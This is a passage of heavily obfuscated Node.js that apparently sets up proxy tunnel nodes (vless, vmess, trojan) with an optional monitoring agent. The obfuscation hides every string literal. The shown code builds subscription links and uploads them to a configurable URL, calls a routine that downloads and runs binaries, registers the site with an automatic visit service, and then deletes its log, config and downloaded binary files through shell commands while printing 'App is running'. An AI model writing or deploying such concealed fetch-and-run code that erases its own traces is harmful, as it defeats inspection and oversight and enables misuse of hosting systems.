_0x5dc39f[_0x135ec4(0x15c)][_0x135ec4(0xf5)]+'_'+_0x5dc39f[_0x135ec4(0x15c)][_0x135ec4(0x178)];}catch(_0x5a37a3){try{const _0xc94c9d=await axios[_0x135ec4(0x134)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0xc94c9d[_0x135ec4(_0x5f3ee8._0x37a668)]&&_0xc94c9d[_0x135ec4(_0x5f3ee8._0x37a668)][_0x135ec4(0x145)]===_0x135ec4(_0x5f3ee8._0x131b01)&&_0xc94c9d[_0x135ec4(_0x5f3ee8._0xad9663)]['countryCode']&&_0xc94c9d[_0x135ec4(0x15c)]['org'])return _0xc94c9d[_0x135ec4(_0x5f3ee8._0x37a668)][_0x135ec4(0x137)]+'_'+_0xc94c9d[_0x135ec4(_0x5f3ee8._0x37a668)][_0x135ec4(0x178)];}catch(_0x1498f3){}}return _0x135ec4(0x12d);}async function _0x3c3292(_0x8f3c1d){const _0x46bfb0={_0x16192b:0xe0,_0x399c52:0x1ac,_0x22ed04:0x14d,_0x25b2b2:0x148,_0x24393a:0x1a3,_0x398d98:0xfc,_0xf04e11:0x173,_0x50c9c3:0x1a3,_0x83cf32:0x17c,_0x3d3ce9:0x134},_0x1fe440=await _0x51bb25(),_0x524907=NAME?NAME+'-'+_0x1fe440:_0x1fe440;return new Promise(_0x3f2346=>{const _0x1075ed={_0x1177de:0x1a3,_0x522282:0x17c,_0x47743f:0x100,_0x18a284:0x17d};setTimeout(()=>{const _0x472f5f=_0x1862,_0xebcd54={'v':'2','ps':''+_0x524907,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x472f5f(_0x46bfb0._0x16192b),'net':'ws','type':_0x472f5f(_0x46bfb0._0x16192b),'host':_0x8f3c1d,'path':_0x472f5f(0x17f),'tls':'tls','sni':_0x8f3c1d,'alpn':'','fp':'firefox'},_0x628446=_0x472f5f(0x143)+UUID+'@'+CFIP+':'+CFPORT+_0x472f5f(_0x46bfb0._0x399c52)+_0x8f3c1d+_0x472f5f(0x141)+_0x8f3c1d+_0x472f5f(_0x46bfb0._0x22ed04)+_0x524907+_0x472f5f(_0x46bfb0._0x25b2b2)+Buffer[_0x472f5f(_0x46bfb0._0x24393a)](JSON[_0x472f5f(_0x46bfb0._0x398d98)](_0xebcd54))[_0x472f5f(_0x46bfb0._0xf04e11)](_0x472f5f(0x17c))+_0x472f5f(0xf3)+UUID+'@'+CFIP+':'+CFPORT+_0x472f5f(0x195)+_0x8f3c1d+_0x472f5f(0x141)+_0x8f3c1d+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x524907+'\x0a\x20\x20\x20\x20';console[_0x472f5f(0x101)](Buffer['from'](_0x628446)['toString'](_0x472f5f(0x17c))),fs['writeFileSync'](subPath,Buffer[_0x472f5f(_0x46bfb0._0x50c9c3)](_0x628446)['toString'](_0x472f5f(_0x46bfb0._0x83cf32))),console['log'](FILE_PATH+_0x472f5f(0x15d)),uploadNodes(),app[_0x472f5f(_0x46bfb0._0x3d3ce9)]('/'+SUB_PATH,(_0x68a75c,_0x31945a)=>{const _0x1583ce=_0x472f5f,_0x187765=Buffer[_0x1583ce(_0x1075ed._0x1177de)](_0x628446)[_0x1583ce(0x173)](_0x1583ce(_0x1075ed._0x522282));_0x31945a[_0x1583ce(_0x1075ed._0x47743f)](_0x1583ce(0x154),_0x1583ce(0x127)),_0x31945a[_0x1583ce(_0x1075ed._0x18a284)](_0x187765);}),_0x3f2346(_0x628446);},0x7d0);});}}async function uploadNodes(){const _0x3c2b13={_0x5bd093:0x168,_0x43c9d6:0x145,_0xe1cbd7:0x151,_0x170845:0x188,_0x13b575:0xfc,_0x3a1af1:0x12a,_0x4fe3e5:0x145,_0x38854e:0x101},_0x25f9a0=_0x7d32b;if(UPLOAD_URL&&PROJECT_URL){const _0x36f1ab=PROJECT_URL+'/'+SUB_PATH,_0x2aea58={'subscription':[_0x36f1ab]};try{const _0x4377f1=await axios[_0x25f9a0(0x1a8)](UPLOAD_URL+_0x25f9a0(0x10c),_0x2aea58,{'headers':{'Content-Type':_0x25f9a0(0x12e)}});return _0x4377f1&&_0x4377f1[_0x25f9a0(0x145)]===0xc8?(console[_0x25f9a0(0x101)](_0x25f9a0(0x11d)),_0x4377f1):null;}catch(_0x38f25e){if(_0x38f25e[_0x25f9a0(_0x3c2b13._0x5bd093)]){if(_0x38f25e['response'][_0x25f9a0(_0x3c2b13._0x43c9d6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x25f9a0(0x165)](listPath))return;const _0x485101=fs[_0x25f9a0(0x10b)](listPath,_0x25f9a0(_0x3c2b13._0xe1cbd7)),_0x17b0c6=_0x485101[_0x25f9a0(0x144)]('\x0a')[_0x25f9a0(_0x3c2b13._0x170845)](_0x4bad4d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x25f9a0(0x111)](_0x4bad4d));if(_0x17b0c6[_0x25f9a0(0x1a9)]===0x0)return;const _0x42edf0=JSON[_0x25f9a0(_0x3c2b13._0x13b575)]({'nodes':_0x17b0c6});try{const _0xb0b0d2=await axios[_0x25f9a0(0x1a8)](UPLOAD_URL+_0x25f9a0(_0x3c2b13._0x3a1af1),_0x42edf0,{'headers':{'Content-Type':_0x25f9a0(0x12e)}});return _0xb0b0d2&&_0xb0b0d2[_0x25f9a0(_0x3c2b13._0x4fe3e5)]===0xc8?(console[_0x25f9a0(_0x3c2b13._0x38854e)](_0x25f9a0(0xe9)),_0xb0b0d2):null;}catch(_0x258108){return null;}}else return;}}function cleanFiles(){const _0x27d06f={_0x435b6f:0x150,_0x201219:0x172,_0x454d50:0x158,_0x4e893e:0xe6,_0x5da107:0x16b};setTimeout(()=>{const _0x28e6ee={_0x574d9f:0x18d,_0x4d770e:0x17a},_0x3c88e6={_0x566a1d:0x18d,_0x3e90d2:0x101},_0x11b5e8=_0x1862,_0x2c0a44=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c0a44[_0x11b5e8(_0x27d06f._0x435b6f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c0a44[_0x11b5e8(_0x27d06f._0x435b6f)](phpPath);process[_0x11b5e8(_0x27d06f._0x201219)]===_0x11b5e8(0xfe)?exec(_0x11b5e8(0x192)+_0x2c0a44[_0x11b5e8(_0x27d06f._0x454d50)]('\x20')+_0x11b5e8(_0x27d06f._0x4e893e),_0x5d77cf=>{const _0x56b2bd=_0x11b5e8;console[_0x56b2bd(_0x3c88e6._0x566a1d)](),console[_0x56b2bd(0x101)](_0x56b2bd(0x105)),console[_0x56b2bd(_0x3c88e6._0x3e90d2)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x11b5e8(0x1a5)+_0x2c0a44[_0x11b5e8(0x158)]('\x20')+_0x11b5e8(_0x27d06f._0x5da107),_0x5403c2=>{const _0x350953=_0x11b5e8;console[_0x350953(_0x28e6ee._0x574d9f)](),console['log']('App\x20is\x20running'),console['log'](_0x350953(_0x28e6ee._0x4d770e));});},0x15f90);}cleanFiles();function _0x1862(_0x3ff938,_0x4e8b30){const _0x34553d=_0x3455();return _0x1862=function(_0x186293,_0x4b10b0){_0x186293=_0x186293-0xdf;let _0x4d1646=_0x34553d[_0x186293];return _0x4d1646;},_0x1862(_0x3ff938,_0x4e8b30);}async function AddVisitTask(){const _0x50e046={_0x1148ce:0x101,_0x15a02f:0x119,_0xad2629:0x182,_0x3aeaf:0x117},_0x5091d8=_0x7d32b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5091d8(_0x50e046._0x1148ce)](_0x5091d8(_0x50e046._0x15a02f));return;}try{const _0x36d5f2=await axios[_0x5091d8(0x1a8)](_0x5091d8(_0x50e046._0xad2629),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5091d8(0x12e)}});return console['log'](_0x5091d8(0xe4)),_0x36d5f2;}catch(_0x1b5c94){return console[_0x5091d8(0x12c)](_0x5091d8(_0x50e046._0x3aeaf)+_0x1b5c94['message']),null;}}async function startserver(){const _0x2933e0={_0x4b37f9:0x12c,_0x200481:0xf1},_0x161d2e=_0x7d32b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x545cff){console[_0x161d2e(_0x2933e0._0x4b37f9)](_0x161d2e(_0x2933e0._0x200481),_0x545cff);}}startserver()[_0x7d32b(0x15b)](_0x435993=>{const _0x25d0b2=_0x7d32b;console[_0x25d0b2(0x12c)](_0x25d0b2(0x103),_0x435993);}),app[_0x7d32b(0xe5)](PORT,()=>console[_0x7d32b(0x101)](_0x7d32b(0x11a)+PORT+'!'));
